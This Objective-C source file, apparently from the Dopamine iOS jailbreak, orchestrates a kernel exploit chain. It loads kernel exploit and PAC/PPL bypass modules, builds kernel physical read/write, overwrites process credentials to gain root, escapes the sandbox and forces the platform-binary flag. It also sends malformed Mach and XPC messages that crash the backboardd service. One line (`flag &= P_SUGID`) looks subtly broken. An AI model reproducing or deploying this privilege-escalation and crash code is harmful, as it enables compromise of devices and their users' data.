//
//  Jailbreaker.m
//  Dopamine
//

#import "DOJailbreaker.h"
#import "DOEnvironmentManager.h"
#import "DOExploitManager.h"
#import "DOUIManager.h"
#import "clock_alarm.h"

#import <dlfcn.h>
#import <unistd.h>
#import <xpc/xpc.h>
#import <xpf/xpf.h>
#import <sys/utsname.h>
#import <IOSurface/IOSurfaceRef.h>
#import <libjailbreak/codesign.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/primitives_IOSurface.h>
#import <libjailbreak/physrw_pte.h>
#import <libjailbreak/physrw.h>
#import <libjailbreak/translation.h>
#import <libjailbreak/kernel.h>
#import <libjailbreak/info.h>
#import <libjailbreak/util.h>
#import <libjailbreak/kcall_arm64.h>

static NSString *const JBErrorDomain = @"JBErrorDomain";
typedef NS_ENUM(NSInteger, JBErrorCode) {
    JBErrorCodeFailedToFindKernel       = -1,
    JBErrorCodeFailedKernelPatchfinding = -2,
    JBErrorCodeFailedLoadingExploit     = -3,
    JBErrorCodeFailedExploitation       = -4,
    JBErrorCodeFailedBuildingPhysRW     = -5,
    JBErrorCodeFailedCleanup            = -6,
    JBErrorCodeFailedGetRoot            = -7,
    JBErrorCodeFailedUnsandbox          = -8,
    JBErrorCodeFailedPlatformize        = -9,
};

@interface DOJailbreaker ()
- (NSError *)gatherSystemInformation;
- (NSError *)doExploitation;
- (NSError *)buildPhysRWPrimitive;
- (NSError *)cleanUpExploits;
- (NSError *)elevatePrivileges;
@end

@implementation DOJailbreaker

- (NSError *)gatherSystemInformation
{
    NSString *kernelPath = [[DOEnvironmentManager sharedManager] accessibleKernelPath];
    if (!kernelPath) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedToFindKernel userInfo:@{NSLocalizedDescriptionKey:@"Failed to find kernelcache"}];
    }
    NSLog(@"Kernel at %@", kernelPath);

    NSString *sptmPath = [[DOEnvironmentManager sharedManager] accessibleSPTMPath];
    NSString *txmPath = [[DOEnvironmentManager sharedManager] accessibleTXMPath];
    if (sptmPath) NSLog(@"SPTM at %@", sptmPath);
    if (txmPath) NSLog(@"TXM at %@", txmPath);

    [[DOUIManager sharedInstance] sendLog:@"Patchfinding" debug:NO];

    int r = xpf_start_with_kernel_path(kernelPath.fileSystemRepresentation, sptmPath ? sptmPath.fileSystemRepresentation : NULL, txmPath ? txmPath.fileSystemRepresentation : NULL);
    if (r != 0) {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF start failed: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }

    char *sets[] = {
        "translation", "trustcache", "sandbox", "physmap", "struct", "physrw", "IOSurface",
        NULL, NULL, NULL, NULL, NULL,
    };
    uint32_t idx = 0;
    while (sets[++idx]);
    if (xpf_set_is_supported("devmode")) sets[idx++] = "devmode";
    if (xpf_set_is_supported("badRecovery")) sets[idx++] = "badRecovery";
    if (xpf_set_is_supported("arm64kcall")) sets[idx++] = "arm64kcall";
    if (xpf_set_is_supported("perfkrw")) sets[idx++] = "perfkrw";

    xpc_object_t systemInfoXdict = xpf_construct_offset_dictionary((const char **)sets);
    if (systemInfoXdict) {
        xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticBase", gXPF.kernelBase);
        if (gXPF.sptm) xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticSptmBase", gXPF.sptmBase);
        if (gXPF.txm) xpc_dictionary_set_uint64(systemInfoXdict, "kernelConstant.staticTxmBase", gXPF.txmBase);
    }
    if (!systemInfoXdict) {
        NSError *error = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedKernelPatchfinding userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"XPF failed: (%s)", xpf_get_error()]}];
        xpf_stop();
        return error;
    }
    xpf_stop();

    jbinfo_initialize_dynamic_offsets(systemInfoXdict);
    jbinfo_initialize_hardcoded_offsets();

    if ([NSBundle mainBundle].bundleIdentifier) {
        gSystemInfo.jailbreakInfo.appIdentifier = strdup([NSBundle mainBundle].bundleIdentifier.UTF8String);
    }
    return nil;
}

- (NSError *)doExploitation
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;

    if (!kernelExploit) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"ClearSword is required but was not found"}];
    }
    if (!pacBypass && [DOEnvironmentManager sharedManager].isPACBypassRequired) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"PAC bypass is required but was not found"}];
    }
    if (!pplBypass && [DOEnvironmentManager sharedManager].isPPLBypassRequired) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"%@ bypass is required but was not found", kind]}];
    }

    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Exploiting Kernel (%@)", kernelExploit.name] debug:NO];
    if ([kernelExploit load] != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load kernel exploit: %s", dlerror()]}];
    }
    if ([kernelExploit run] != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to exploit kernel"}];
    }

    jbinfo_initialize_boot_constants();
    libjailbreak_translation_init();
    libjailbreak_IOSurface_primitives_init();

    if (pacBypass) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Bypassing PAC (%@)", pacBypass.name] debug:NO];
        if ([pacBypass load] != 0) {
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load PAC bypass: %s", dlerror()]}];
        }
        if ([pacBypass run] != 0) {
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"Failed to bypass PAC"}];
        }
        gSystemInfo.jailbreakInfo.usesPACBypass = true;
    }

    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Bypassing %@ (%@)", kind, pplBypass.name] debug:NO];
        if ([pplBypass load] != 0) {
            [pacBypass cleanup];
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedLoadingExploit userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to load %@ bypass: %s", kind, dlerror()]}];
        }
        if ([pplBypass run] != 0) {
            [pacBypass cleanup];
            [kernelExploit cleanup];
            return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to bypass %@", kind]}];
        }
    }

    if (![DOEnvironmentManager sharedManager].isArm64e) {
        arm64_kcall_init();
    }
    return nil;
}

- (NSError *)buildPhysRWPrimitive
{
    int r = device_supports_physrw_pte() ? libjailbreak_physrw_pte_init(false, 0) : libjailbreak_physrw_init(false);
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedBuildingPhysRW userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to build phys r/w primitive: %d", r]}];
    }
    return nil;
}

- (NSError *)cleanUpExploits
{
    int r = [[DOExploitManager sharedManager] cleanUpExploits];
    if (r != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedCleanup userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to cleanup exploits: %d", r]}];
    }
    IOSurface_map_cleanup();
    return nil;
}

- (NSError *)elevatePrivileges
{
    uint64_t proc = proc_self();
    uint64_t ucred = proc_ucred(proc);

    kwrite32(proc + koffsetof(proc, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, svuid), 0);
    kwrite32(ucred + koffsetof(ucred, ruid), 0);
    kwrite32(ucred + koffsetof(ucred, uid), 0);

    kwrite32(proc + koffsetof(proc, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, rgid), 0);
    kwrite32(ucred + koffsetof(ucred, svgid), 0);
    kwrite32(ucred + koffsetof(ucred, groups), 0);

    uint32_t flag = kread32(proc + koffsetof(proc, flag));
    if ((flag & P_SUGID) != 0) {
        flag &= P_SUGID;
        kwrite32(proc + koffsetof(proc, flag), flag);
    }

    if (getuid() != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, uid still %d", getuid()]}];
    }
    if (getgid() != 0) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedGetRoot userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to get root, gid still %d", getgid()]}];
    }

    uint64_t label = kread_ptr(ucred + koffsetof(ucred, label));
    mac_label_set(label, 1, -1);
    NSError *error = nil;
    [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&error];
    if (error) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedUnsandbox userInfo:@{NSLocalizedDescriptionKey:[NSString stringWithFormat:@"Failed to unsandbox, /var is not accessible (%@)", error.localizedDescription]}];
    }
    setenv("HOME", "/var/root", true);
    setenv("CFFIXED_USER_HOME", "/var/root", true);
    setenv("TMPDIR", "/var/tmp", true);

    proc_csflags_set(proc, CS_PLATFORM_BINARY);
    uint32_t csflags;
    csops(getpid(), CS_OPS_STATUS, &csflags, sizeof(csflags));
    if (!(csflags & CS_PLATFORM_BINARY)) {
        return [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedPlatformize userInfo:@{NSLocalizedDescriptionKey:@"Failed to get CS_PLATFORM_BINARY"}];
    }
    return nil;
}

- (void)runMiniWithError:(NSError **)errOut
{
    *errOut = nil;

    struct utsname systemInfo;
    uname(&systemInfo);
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Starting Mini Dopamine (%s, %@)", systemInfo.machine, NSProcessInfo.processInfo.operatingSystemVersionString] debug:NO];

    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if (!kernelExploit) {
        *errOut = [NSError errorWithDomain:JBErrorDomain code:JBErrorCodeFailedExploitation userInfo:@{NSLocalizedDescriptionKey:@"ClearSword is not in the app bundle"}];
        return;
    }
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Kernel exploit: %@ (%@)", kernelExploit.name, kernelExploit.identifier] debug:NO];
    if (!kernelExploit.isSupported) {
        [[DOUIManager sharedInstance] sendLog:@"Warning: ClearSword is not marked supported on this build, continuing anyway" debug:NO];
    }

    DOExploit *pacBypass = [DOExploitManager sharedManager].selectedPACBypass;
    if ([[DOEnvironmentManager sharedManager] isPACBypassRequired]) {
        if (pacBypass) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"PAC bypass: %@ (%@)", pacBypass.name, pacBypass.identifier] debug:NO];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:@"Warning: PAC bypass is required but was not found" debug:NO];
        }
    }

    DOExploit *pplBypass = [DOExploitManager sharedManager].selectedPPLBypass;
    if ([[DOEnvironmentManager sharedManager] isPPLBypassRequired]) {
        NSString *kind = [DOEnvironmentManager sharedManager].isSPTM ? @"SPTM" : @"PPL";
        if (pplBypass) {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"%@ bypass: %@ (%@)", kind, pplBypass.name, pplBypass.identifier] debug:NO];
        }
        else {
            [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"Warning: %@ bypass is required but was not found", kind] debug:NO];
        }
    }

    *errOut = [self gatherSystemInformation];
    if (*errOut) return;

    *errOut = [self doExploitation];
    if (*errOut) {
        [self cleanUpExploits];
        return;
    }

    [[DOUIManager sharedInstance] sendLog:@"Building Phys R/W Primitive" debug:NO];
    *errOut = [self buildPhysRWPrimitive];
    if (*errOut) {
        [self cleanUpExploits];
        return;
    }

    [[DOUIManager sharedInstance] sendLog:@"Cleaning Up Exploits" debug:NO];
    *errOut = [self cleanUpExploits];
    if (*errOut) return;

    [[DOUIManager sharedInstance] sendLog:@"Elevating Privileges" debug:NO];
    *errOut = [self elevatePrivileges];
    if (*errOut) return;

    uint64_t proc = proc_self();
    uint32_t kpid = kread32(proc + koffsetof(proc, pid));
    uint64_t launchd = proc_find(1);
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"KRW ok: self proc=%#llx pid=%u uid=%d gid=%d", proc, kpid, getuid(), getgid()] debug:NO];
    [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"proc_find(1)=%#llx", launchd] debug:NO];

    NSError *fsError = nil;
    NSArray *varEntries = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var" error:&fsError];
    if (fsError) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"/var not readable: %@", fsError.localizedDescription] debug:NO];
    } else {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"unsandbox ok: /var entries=%lu", (unsigned long)varEntries.count] debug:NO];
    }

    NSString *bundleRoot = @"/var/containers/Bundle/Application";
    NSArray *appUUIDs = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:bundleRoot error:&fsError];
    if (fsError) {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"App bundle dir not readable: %@", fsError.localizedDescription] debug:NO];
    } else {
        [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"App bundle dir entries=%lu", (unsigned long)appUUIDs.count] debug:NO];
        NSUInteger logged = 0;
        for (NSString *uuid in appUUIDs) {
            NSString *uuidPath = [bundleRoot stringByAppendingPathComponent:uuid];
            NSArray *items = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:uuidPath error:nil];
            for (NSString *item in items) {
                if (![item.pathExtension isEqualToString:@"app"]) continue;
                NSDictionary *info = [NSDictionary dictionaryWithContentsOfFile:[[uuidPath stringByAppendingPathComponent:item] stringByAppendingPathComponent:@"Info.plist"]];
                NSString *bundleId = info[@"CFBundleIdentifier"];
                if (!bundleId) continue;
                [[DOUIManager sharedInstance] sendLog:[NSString stringWithFormat:@"app: %@", bundleId] debug:NO];
                if (++logged >= 8) break;
            }
            if (logged >= 8) break;
        }
    }

    [[DOUIManager sharedInstance] sendLog:@"Mini Dopamine ready: KRW + process/file access" debug:NO];
}

- (IOSurfaceRef)allocatePurpleGfxMemWithSize:(size_t)size
{
    NSDictionary *surfaceProperties = @{
        @"IOSurfaceMemoryRegion": @"PurpleGfxMem",
        @"IOSurfaceAllocSize": @(size),
    };
    return IOSurfaceCreate((__bridge CFDictionaryRef)surfaceProperties);
}

- (BOOL)surfaceIsContiguous:(IOSurfaceRef)surface
{
    vm_address_t mem_addr = (vm_address_t)IOSurfaceGetBaseAddress(surface);
    vm_size_t mem_size = (vm_size_t)IOSurfaceGetAllocSize(surface);
    vm_region_submap_short_info_data_64_t info = {0};
    uint32_t count = VM_REGION_SUBMAP_SHORT_INFO_COUNT_64;
    natural_t depth = 9999999;
    kern_return_t kr = vm_region_recurse_64(mach_task_self(), &mem_addr, &mem_size, &depth, (vm_region_recurse_info_t)&info, &count);
    return (kr == 0 && info.share_mode == SM_EMPTY && info.object_id != 0);
}

- (BOOL)contiguousMappingWorks
{
    IOSurfaceRef surface = [self allocatePurpleGfxMemWithSize:0x8000];
    if (surface == NULL) return false;
    BOOL contiguous = [self surfaceIsContiguous:surface];
    CFRelease(surface);
    return contiguous;
}

- (BOOL)contiguousMappingWorkaroundNeeded
{
    DOExploit *kernelExploit = [DOExploitManager sharedManager].selectedKernelExploit;
    if ([kernelExploit hasRequirement:@"contiguousMapping"]) {
        return ![self contiguousMappingWorks];
    }
    return NO;
}

- (int)crashBackboardd
{
#pragma pack(push, 4)
    typedef struct {
        mach_msg_header_t header;
        mach_msg_body_t body;
        mach_msg_ool_descriptor_t archive;
        NDR_record_t ndr;
        mach_msg_type_number_t archiveLength;
    } Request;
#pragma pack(pop)

    kern_return_t bootstrap_look_up(mach_port_t, const char *, mach_port_t *);

    NSData *archive = [NSKeyedArchiver archivedDataWithRootObject:@[ @[] ] requiringSecureCoding:YES error:nil];
    mach_port_t bootstrap = MACH_PORT_NULL;
    mach_port_t service = MACH_PORT_NULL;

    if (!archive ||
        task_get_bootstrap_port(mach_task_self(), &bootstrap) != KERN_SUCCESS ||
        bootstrap_look_up(bootstrap, "com.apple.backboard.hid.services", &service) != KERN_SUCCESS) {
        return -1;
    }

    Request request = {0};
    request.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    request.header.msgh_size = sizeof(request);
    request.header.msgh_remote_port = service;
    request.header.msgh_id = 6000032;
    request.body.msgh_descriptor_count = 1;
    request.archive.address = (void *)archive.bytes;
    request.archive.size = (mach_msg_size_t)archive.length;
    request.archive.copy = MACH_MSG_VIRTUAL_COPY;
    request.archive.type = MACH_MSG_OOL_DESCRIPTOR;
    request.ndr = NDR_record;
    request.archiveLength = (mach_msg_type_number_t)archive.length;

    (void)mach_msg(&request.header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, request.header.msgh_size, 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    mach_port_deallocate(mach_task_self(), service);
    return 0;
}

- (int)crashBackboardd_15
{
    xpc_connection_t (*haxx_xpc_connection_create_mach_service)(const char *, dispatch_queue_t, uint64_t) = dlsym(RTLD_DEFAULT, "xpc_connection_create_mach_service");
    if (!haxx_xpc_connection_create_mach_service) return -1;
    xpc_connection_t client = haxx_xpc_connection_create_mach_service("com.apple.backboard.TouchDeliveryPolicyServer", NULL, 0);
    xpc_connection_set_event_handler(client, ^(xpc_object_t event) {});
    xpc_connection_resume(client);
    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
    uint8_t root[1024] = {0};
    memcpy(root, "bplist17", strlen("bplist17"));
    xpc_dictionary_set_data(message, "root", root, 1024);
    xpc_dictionary_set_uint64(message, "proxynum", 1);
    xpc_dictionary_set_uint64(message, "inv", 1);
    uint8_t uaf_xpc[1024];
    memset(uaf_xpc, 0x41, 1024);
    xpc_dictionary_set_value(message, "ool", xpc_data_create(uaf_xpc, 1024));
    xpc_connection_send_message_with_reply_sync(client, message);
    return 0;
}

- (void)applyContiguousMappingWorkaround
{
    if (@available(iOS 16.0, *)) {
        [self crashBackboardd];
    } else {
        [self crashBackboardd_15];
    }

    IOSurfaceRef surface = NULL;
    do {
        if (surface) {
            CFRelease(surface);
            surface = NULL;
            usleep(50);
        }
        surface = [self allocatePurpleGfxMemWithSize:0x8000];
    } while (![self surfaceIsContiguous:surface]);

    printf("Got contiguous mapping surface %p\n", surface);
    mach_port_t surfacePort = IOSurfaceCreateMachPort(surface);
    kern_return_t kr = clock_alarm_preserve_port(surfacePort, 20);
    mach_port_mod_refs(mach_task_self(), surfacePort, MACH_PORT_RIGHT_SEND, -1);
    CFRelease(surface);
    printf("preserved port? %d\n", kr);
}

@end
